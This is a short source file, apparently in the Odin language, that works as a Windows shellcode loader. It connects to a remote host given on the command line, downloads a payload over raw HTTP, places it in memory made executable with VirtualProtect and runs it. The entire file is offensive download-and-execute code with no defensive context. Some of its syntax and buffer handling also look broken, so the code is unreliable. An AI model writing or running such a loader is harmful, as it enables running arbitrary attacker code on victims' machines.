package main

import "core:fmt"
import "core:net"
import "core:os"
import "core:strings"
import "core:sys/windows"
import "core:mem"

main :: proc() {
    if len(os.args) != 4 {
        fmt.println("Usage: ", os.args[0], " <RemoteIP> <RemotePort> <Resource>")
        os.exit(1)
    }

    host := os.args[1]
    port := os.args[2]
    resource := os.args[3]

    power(host, port, resource)
}

power :: proc(host: string, port: string, resource: string) {
    addr := net.resolve_address(host, port) or_else {
        fmt.eprintln("Failed to resolve address:", net.resolve_address_error_string(net.get_last_error()))
        os.exit(1)
    }

    conn := net.dial_tcp(addr) or_else {
        fmt.eprintln("Failed to connect to server:", net.dial_tcp_error_string(net.get_last_error()))
        os.exit(1)
    }
    defer net.close(conn)

    request := fmt.tprintf("GET /{}\r\nHost: {}\r\n\r\n", resource, host)
    net.send(conn, transmute([]byte)request) or_else {
        fmt.eprintln("Failed to send request:", net.send_error_string(net.get_last_error()))
        os.exit(1)
    }

    response_buffer_size :: 4096
    response := make([]byte, response_buffer_size)
    defer delete(response)

    for {
        n := net.recv(conn, response) or_else {
            fmt.eprintln("Failed to receive data:", net.recv_error_string(net.get_last_error()))
            os.exit(1)
        }
        if n == 0 {
            break
        }
        fmt.println("Received", n, "bytes")
    }

    shellcode := response[strings.index(string(response), "\r\n\r\n") + 4:]

    shellcode_size := len(shellcode)
    if shellcode_size == 0 {
        fmt.eprintln("Received empty shellcode")
        os.exit(1)
    }

    shellcode_ptr := windows.VirtualAlloc(nil, uint(shellcode_size), windows.MEM_COMMIT | windows.MEM_RESERVE, windows.PAGE_READWRITE)
    if shellcode_ptr == nil {
        fmt.eprintln("Failed to allocate memory:", windows.GetLastError())
        os.exit(1)
    }
    defer windows.VirtualFree(shellcode_ptr, 0, windows.MEM_RELEASE)

    mem.copy(shellcode_ptr, raw_data(shellcode), shellcode_size)

    old_protect: windows.DWORD
    if !windows.VirtualProtect(shellcode_ptr, uint(shellcode_size), windows.PAGE_EXECUTE_READ, &old_protect) {
        fmt.eprintln("Failed to change memory protection:", windows.GetLastError())
        os.exit(1)
    }

    shellcode_func := (proc "stdcall" ())shellcode_ptr
    shellcode_func()
}